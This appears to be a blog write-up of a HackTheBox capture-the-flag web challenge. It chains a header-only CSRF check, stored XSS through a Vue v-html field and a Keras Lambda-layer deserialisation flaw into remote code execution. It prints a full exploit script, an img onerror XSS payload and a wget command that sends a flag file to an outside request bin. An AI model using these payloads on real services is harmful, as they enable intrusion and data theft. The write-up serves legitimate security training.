---
title: "HTB: Why Lambda"
date: 2025-07-15T22:20:00+08:00
draft: false
author: "Jack Sun"
tags:
  - CTFs
  - Writeups
  - HackTheBox
  - Cybersecurity
image: /images/writeups/HTB/why-lambda/banner.png
---

## Description

- 60 pts, Hard Web
- Written by ` MasterSplinter`

## Static Analysis

The `challenge/backend/model.py` file provides an example of training and saving a Keras ML model in a `h5` format. On further inspection, the application also provides a mechanism to load a pretrained model via the `POST /api/internal/model` endpoint.

This arrangement is reminiscent of a deserialisation attack. I came across this article after some googling: [https://mastersplinter.work/research/tensorflow-rce/](https://mastersplinter.work/research/tensorflow-rce/). The author explained that a `Lambda` layer can be introduced in the model to cause RCE when the model is saved then loaded using `tensorflow.keras.models.load_model()`.

Looking at the model submission endpoint a bit closer, it is protected by 2 decorators:

```py
@app.route("/api/internal/model", methods=["POST"])
@authenticated
@csrf_protection
def submit_model():
    ...
```

The `csrf_protection` decorator is easy to bypass; a nonce is not used and instead the decorator simply checks if the `X-SPACE-NO-CSRF` header is set to "1". The `authenticated` decorator does not seem bypassable - we will need to either forge or making use of an existing authenticated session to hit this endpoint.

In `challenge/backend/complaints.py`, there is a `check_complaints` function that gets called when a new complaint is created by calling `POST /api/complaint`. The `check_complaints` function involves a bot authenticating to the website, then clicking a button on the complaints page. If we can find a XSS vulnerability, we could leverage the authenticated bot to make a request to upload a malicious `h5` model to `/api/internal/model`, which tries to load the model, thereby triggering RCE.

Luckily, `challenge/frontend/src/components/ImageBanner.vue` makes use of `v-html` to render text, which is susceptible to XSS. This component is used in the dashboard to render the prediction. `prediction` is a field we can control when we create a new complaint by hitting `POST /api/complaint` as an unauthenticated user.

We now have all the gadgets we need to construct a full RCE attack chain :D

## Attack Chain

We first need to build and save a custom Keras model that when loaded, triggers RCE to exfiltrate the flag to a request bin we control.

```py
import tensorflow as tf


def exploit(x):
    import os

    os.system("wget --post-file=/app/flag.txt https://webhook.site/...")
    return x


model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

Now, we need to get the complaints bot to submit this model to the server via XSS. We can do this by running javascript to take a base64 representation of the model, before converting and posting it:

```js
const dataurl = "data:text/plain;base64,{base64 of malicious model}";

fetch(dataurl)
  .then((res) => res.blob())
  .then((blob) => {
    const file = new File([blob], "exploit.h5");
    const data = new FormData();
    data.append("file", file);
    fetch("/api/internal/model", {
      method: "POST",
      body: data,
      headers: { "X-SPACE-NO-CSRF": "1" },
    });
  });
```

We minify the JS with the h5 payload and embed it in the `onerror` attribute of an error-present `img` element as follows:

```py
from base64 import b64encode

payload = ""

with open("exploit.h5", "rb") as f:
    exploit_h5 = f.read()

exploit_h5_b64 = b64encode(exploit_h5).decode()

payload += f"const dataurl = 'data:text/plain;base64,{exploit_h5_b64}';"
payload += "fetch(dataurl).then(res => res.blob()).then(blob => {const file = new File([blob], 'exploit.h5'); const data = new FormData(); data.append('file', file); fetch('/api/internal/model', {method: 'POST', body: data, headers: {'X-SPACE-NO-CSRF': '1'}});});"

prediction = f'<img src=x onerror="{payload}"></img>'
```

Finally, we make a request to POST a new complaint, which will cause the bot to visit the dashboard and trigger the XSS.

```py
import requests

BASE_URL = "http://<ip>/api"
COMPLAINT_URL = f"{BASE_URL}/complaint"

s = requests.Session()
s.headers["X-SPACE-NO-CSRF"] = "1"

s.post(
    COMPLAINT_URL,
    json={
        "description": "asdf",
        "image_data": "asdf",
        "prediction": prediction,
    },
)
```

## Full Exploit Script

```py
from base64 import b64encode
import requests
import tensorflow as tf


# Build malicious model
def exploit(x):
    import os

    os.system("wget --post-file=/app/flag.txt https://webhook.site/...")
    return x


model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")

# Build XSS payload
payload = ""

with open("exploit.h5", "rb") as f:
    exploit_h5 = f.read()

exploit_h5_b64 = b64encode(exploit_h5).decode()

payload += f"const dataurl = 'data:text/plain;base64,{exploit_h5_b64}';"
payload += "fetch(dataurl).then(res => res.blob()).then(blob => {const file = new File([blob], 'exploit.h5'); const data = new FormData(); data.append('file', file); fetch('/api/internal/model', {method: 'POST', body: data, headers: {'X-SPACE-NO-CSRF': '1'}});});"

prediction = f'<img src=x onerror="{payload}"></img>'

# Create a complaint, which causes the bot to visit the dashboard, triggering XSS
BASE_URL = "http://<ip>/api"
COMPLAINT_URL = f"{BASE_URL}/complaint"

s = requests.Session()
s.headers["X-SPACE-NO-CSRF"] = "1"

s.post(
    COMPLAINT_URL,
    json={
        "description": "asdf",
        "image_data": "asdf",
        "prediction": prediction,
    },
)
```
